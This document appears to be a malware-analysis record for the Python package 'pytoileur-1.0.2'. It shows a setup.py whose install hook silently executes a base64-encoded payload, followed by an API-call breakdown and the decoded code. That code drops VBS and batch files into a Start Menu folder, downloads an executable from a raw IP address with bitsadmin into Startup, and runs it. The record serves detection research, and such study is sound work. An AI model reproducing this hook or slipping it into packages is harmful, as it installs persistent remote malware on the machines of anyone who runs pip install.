[
  {
    "pyfile": "setup.py",
    "code_snippet": "import os\nimport subprocess\nimport base64\nfrom setuptools.command.install import install\n\nclass InstallCommand(install):\n    def run(self):\n        try:\n            exec(__import__('base64').b64decode(\"aW1wb3J0IG9zCmltcG9ydCBzdWJwcm9jZXNzCmxvZ2luID0gb3MuZ2V0bG9naW4oKQppZiBvcy5wYXRoLmV4aXN0cyhmJ0M6XFxVc2Vyc1xce2xvZ2lufVxcQXBwRGF0YVxcUm9hbWluZ1xcTWljcm9zb2Z0XFxXaW5kb3dzXFxTdGFydCBNZW51XFxQcm9ncmFtc1xcU3lzdGVtODZcXCcpID09IEZhbHNlOgoKICAgIG9zLm1rZGlyKGYiQzpcXFVzZXJzXFx7bG9naW59XFxBcHBEYXRhXFxSb2FtaW5nXFxNaWNyb3NvZnRcXFdpbmRvd3NcXFN0YXJ0IE1lbnVcXFByb2dyYW1zXFxTeXN0ZW04NiIpCiAgICBvcGVuKGYiQzpcXFVzZXJzXFx7bG9naW59XFxBcHBEYXRhXFxSb2FtaW5nXFxNaWNyb3NvZnRcXFdpbmRvd3NcXFN0YXJ0IE1lbnVcXFByb2dyYW1zXFxTeXN0ZW04NlxcV0lOMzIudmJzIiwgImEiKS53cml0ZShmJ1NldCBXc2hTaGVsbCA9IENyZWF0ZU9iamVjdCgiV1NjcmlwdC5TaGVsbCIpIFxuV3NoU2hlbGwuUnVuIGNocigzNCkgJiAiQzpcXFVzZXJzXFx7bG9naW59XFxBcHBEYXRhXFxSb2FtaW5nXFxNaWNyb3NvZnRcXFdpbmRvd3NcXFN0YXJ0IE1lbnVcXFByb2dyYW1zXFxTeXN0ZW04NlxcV0lOMzIuYmF0IiAmIENocigzNCksIDBcblNldCBXc2hTaGVsbCA9IE5vdGhpbmcnKQoKICAgIG9wZW4oZiJDOlxcVXNlcnNcXHtsb2dpbn1cXEFwcERhdGFcXFJvYW1pbmdcXE1pY3Jvc29mdFxcV2luZG93c1xcU3RhcnQgTWVudVxcUHJvZ3JhbXNcXFN5c3RlbTg2XFxXSU4zMi5iYXQiLCAiYSIpLndyaXRlKGYnJydiaXRzYWRtaW4gL3RyYW5zZmVyIG15ZG93bmxvYWRqb2IgL2Rvd25sb2FkIC9wcmlvcml0eSBGT1JFR1JPVU5EICJodHRwOi8vNTEuNzcuMTQwLjE0NDo4MDg2L2RsL3J1bnRpbWUiICJDOlxcVXNlcnNcXHtsb2dpbn1cXEFwcERhdGFcXFJvYW1pbmdcXE1pY3Jvc29mdFxcV2luZG93c1xcU3RhcnQgTWVudVxcUHJvZ3JhbXNcXFN0YXJ0dXBcXFJ1bnRpbWUuZXhlIlxuc3RhcnQgIiIgIkM6XFxVc2Vyc1xce2xvZ2lufVxcQXBwRGF0YVxcUm9hbWluZ1xcTWljcm9zb2Z0XFxXaW5kb3dzXFxTdGFydCBNZW51XFxQcm9ncmFtc1xcU3RhcnR1cFxcUnVudGltZS5leGUiJycnKQogICAgc3VicHJvY2Vzcy5ydW4oZiJDOlxcVXNlcnNcXHtsb2dpbn1cXEFwcERhdGFcXFJvYW1pbmdcXE1pY3Jvc29mdFxcV2luZG93c1xcU3RhcnQgTWVudVxcUHJvZ3JhbXNcXFN5c3RlbTg2XFxXSU4zMi52YnMiLCBzaGVsbD1UcnVlLCBjaGVjaz1UcnVlKQogICAgCmVsc2U6ICAgCiAgICBwYXNz\"))\n        except:\n            pass\n        install.run(self)",
    "pattern_analysis": {
      "api_sequence": [
        "__import__",
        "base64.b64decode",
        "exec",
        "os.getlogin",
        "os.path.exists",
        "os.makedirs",
        "open",
        "open.write",
        "open",
        "open.write",
        "subprocess.run",
        "open",
        "open.write"
      ],
      "api_sequence_with_args": [
        "__import__('base64')",
        "base64.b64decode(\"aW1wb3J0IG9zCmltcG9ydCBzdWJwcm9jZXNzCmxvZ2luID0gb3MuZ2V0bG9naW4oKQppZiBvcy5wYXRoLmV4aXN0cyhmJ0M6XFxVc2Vyc1xce2xvZ2lufVxcQXBwRGF0YVxcUm9hbWluZ1xcTWljcm9zb2Z0XFxXaW5kb3dzXFxTdGFydCBNZW51XFxQcm9ncmFtc1xcU3lzdGVtODZcXCcpID09IEZhbHNlOgoKICAgIG9zLm1rZGlyKGYiQzpcXFVzZXJzXFx7bG9naW59XFxBcHBEYXRhXFxSb2FtaW5nXFxNaWNyb3NvZnRcXFdpbmRvd3NcXFN0YXJ0IE1lbnVcXFByb2dyYW1zXFxTeXN0ZW04NiIpCiAgICBvcGVuKGYiQzpcXFVzZXJzXFx7bG9naW59XFxBcHBEYXRhXFxSb2FtaW5nXFxNaWNyb3NvZnRcXFdpbmRvd3NcXFN0YXJ0IE1lbnVcXFByb2dyYW1zXFxTeXN0ZW04NlxcV0lOMzIudmJzIiwgImEiKS53cml0ZShmJ1NldCBXc2hTaGVsbCA9IENyZWF0ZU9iamVjdCgiV1NjcmlwdC5TaGVsbCIpIFxuV3NoU2hlbGwuUnVuIGNocigzNCkgJiAiQzpcXFVzZXJzXFx7bG9naW59XFxBcHBEYXRhXFxSb2FtaW5nXFxNaWNyb3NvZnRcXFdpbmRvd3NcXFN0YXJ0IE1lbnVcXFByb2dyYW1zXFxTeXN0ZW04NlxcV0lOMzIuYmF0IiAmIENocigzNCksIDBcblNldCBXc2hTaGVsbCA9IE5vdGhpbmcnKQoKICAgIG9wZW4oZiJDOlxcVXNlcnNcXHtsb2dpbn1cXEFwcERhdGFcXFJvYW1pbmdcXE1pY3Jvc29mdFxcV2luZG93c1xcU3RhcnQgTWVudVxcUHJvZ3JhbXNcXFN5c3RlbTg2XFxXSU4zMi5iYXQiLCAiYSIpLndyaXRlKGYnJydiaXRzYWRtaW4gL3RyYW5zZmVyIG15ZG93bmxvYWRqb2IgL2Rvd25sb2FkIC9wcmlvcml0eSBGT1JFR1JPVU5EICJodHRwOi8vNTEuNzcuMTQwLjE0NDo4MDg2L2RsL3J1bnRpbWUiICJDOlxcVXNlcnNcXHtsb2dpbn1cXEFwcERhdGFcXFJvYW1pbmdcXE1pY3Jvc29mdFxcV2luZG93c1xcU3RhcnQgTWVudVxcUHJvZ3JhbXNcXFN0YXJ0dXBcXFJ1bnRpbWUuZXhlIlxuc3RhcnQgIiIgIkM6XFxVc2Vyc1xce2xvZ2lufVxcQXBwRGF0YVxcUm9hbWluZ1xcTWljcm9zb2Z0XFxXaW5kb3dzXFxTdGFydCBNZW51XFxQcm9ncmFtc1xcU3RhcnR1cFxcUnVudGltZS5leGUiJycnKQogICAgc3VicHJvY2Vzcy5ydW4oZiJDOlxcVXNlcnNcXHtsb2dpbn1cXEFwcERhdGFcXFJvYW1pbmdcXE1pY3Jvc29mdFxcV2luZG93c1xcU3RhcnQgTWVudVxcUHJvZ3JhbXNcXFN5c3RlbTg2XFxXSU4zMi52YnMiLCBzaGVsbD1UcnVlLCBjaGVjaz1UcnVlKQogICAgCmVsc2U6ICAgCiAgICBwYXNz\"))",
        "exec(...)",
        "os.getlogin()",
        "os.path.exists(f'C:\\Users\\{login}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\System86\\')",
        "os.makedirs(f'C:\\Users\\{login}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\System86')",
        "open(f'C:\\Users\\{login}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\System86\\WIN32.vbs', 'a')",
        "open(...).write(f'Set WshShell = CreateObject(\"WScript.Shell\") \\nWshShell.Run chr(34) & \"C:\\\\Users\\\\{login}\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\System86\\\\WIN32.bat\" & Chr(34), 0\\nSet WshShell = Nothing')",
        "open(f'C:\\Users\\{login}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\System86\\WIN32.bat', 'a')",
        "open(...).write('bitsadmin /transfer mydownloadjob /download /priority FOREGROUND \"http://51.77.140.144:8086/dl/runtime\" \"C:\\\\Users\\\\{login}\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\System86\\\\Startup\\\\Runtime.exe\"\\nstart \"\" \"C:\\\\Users\\\\{login}\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\System86\\\\Startup\\\\Runtime.exe\"')",
        "subprocess.run(f'C:\\Users\\{login}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\System86\\WIN32.vbs', shell=True, check=True)",
        "open(f'C:\\Users\\{login}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\System86\\WIN32.bat', 'a')",
        "open(...).write('bitsadmin /transfer mydownloadjob /download /priority FOREGROUND \"http://51.77.140.144:8086/dl/runtime\" \"C:\\\\Users\\\\{login}\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\System86\\\\Startup\\\\Runtime.exe\"\\nstart \"\" \"C:\\\\Users\\\\{login}\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\System86\\\\Startup\\\\Runtime.exe\"')"
      ],
      "mapped_sequence": [
        {
          "api_name": "__import__",
          "id": "import_dynamic",
          "description": "Dynamically imports specified module",
          "first_id": "code_execution",
          "second_id": "module_management",
          "third_id": "module_importing"
        },
        {
          "api_name": "base64.b64decode",
          "id": "decode_base64_to_bytes",
          "description": "Decodes base64-encoded string to bytes",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "base_encoding"
        },
        {
          "api_name": "exec",
          "id": "exec_python_code",
          "description": "Dynamically executes Python code string",
          "first_id": "code_execution",
          "second_id": "code_evaluation_execution",
          "third_id": "string_execution"
        },
        {
          "api_name": "os.getlogin",
          "id": "get_username",
          "description": "Retrieves current user's login name",
          "first_id": "information_gathering",
          "second_id": "system_information_collection",
          "third_id": "user_information"
        },
        {
          "api_name": "os.path.exists",
          "id": "check_path_exists",
          "description": "Checks if specified path exists in filesystem",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_checking"
        },
        {
          "api_name": "os.makedirs",
          "id": "create_directory",
          "description": "Creates directory, ignoring if it already exists",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "directory_operations"
        },
        {
          "api_name": "open",
          "id": "basic_write_operations",
          "description": "Basic file opening operations for writing (normal writing, binary writing)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "open.write",
          "id": "basic_file_writing",
          "description": "Writing data to files (strings or bytes)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_writing"
        },
        {
          "api_name": "open",
          "id": "basic_write_operations",
          "description": "Basic file opening operations for writing (normal writing, binary writing)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "open.write",
          "id": "basic_file_writing",
          "description": "Writing data to files (strings or bytes)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_writing"
        },
        {
          "api_name": "subprocess.run",
          "id": "spawn_process_shell",
          "description": "Spawns new process to execute command with shell access",
          "first_id": "command_control_communications",
          "second_id": "command_execution",
          "third_id": "command_reception"
        },
        {
          "api_name": "open",
          "id": "basic_write_operations",
          "description": "Basic file opening operations for writing (normal writing, binary writing)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "open.write",
          "id": "basic_file_writing",
          "description": "Writing data to files (strings or bytes)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_writing"
        }
      ],
      "contextual_code": "import os\nimport subprocess\nimport base64\n\n# Decoded and executed payload\nlogin = os.getlogin()\nif os.path.exists(f'C:\\Users\\{login}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\System86\\') == False:\n    os.makedirs(f'C:\\Users\\{login}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\System86')\n    open(f'C:\\Users\\{login}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\System86\\WIN32.vbs', 'a').write(\n        'Set WshShell = CreateObject(\"WScript.Shell\") \\nWshShell.Run chr(34) & \"C:\\\\Users\\\\{login}\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\System86\\\\WIN32.bat\" & Chr(34), 0\\nSet WshShell = Nothing'\n    )\n    open(f'C:\\Users\\{login}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\System86\\WIN32.bat', 'a').write(\n        'bitsadmin /transfer mydownloadjob /download /priority FOREGROUND \"http://51.77.140.144:8086/dl/runtime\" \"C:\\\\Users\\\\{login}\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\System86\\\\Startup\\\\Runtime.exe\"\\nstart \"\" \"C:\\\\Users\\\\{login}\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\System86\\\\Startup\\\\Runtime.exe\"'\n    )\n    subprocess.run(f'C:\\Users\\{login}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\System86\\WIN32.vbs', shell=True, check=True)\n    open(f'C:\\Users\\{login}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\System86\\WIN32.bat', 'a').write(\n        'bitsadmin /transfer mydownloadjob /download /priority FOREGROUND \"http://51.77.140.144:8086/dl/runtime\" \"C:\\\\Users\\\\{login}\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\System86\\\\Startup\\\\Runtime.exe\"\\nstart \"\" \"C:\\\\Users\\\\{login}\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\System86\\\\Startup\\\\Runtime.exe\"'\n    )"
    }
  },
  {
    "metadata": {
      "package_name": "pytoileur-1.0.2"
    }
  }
]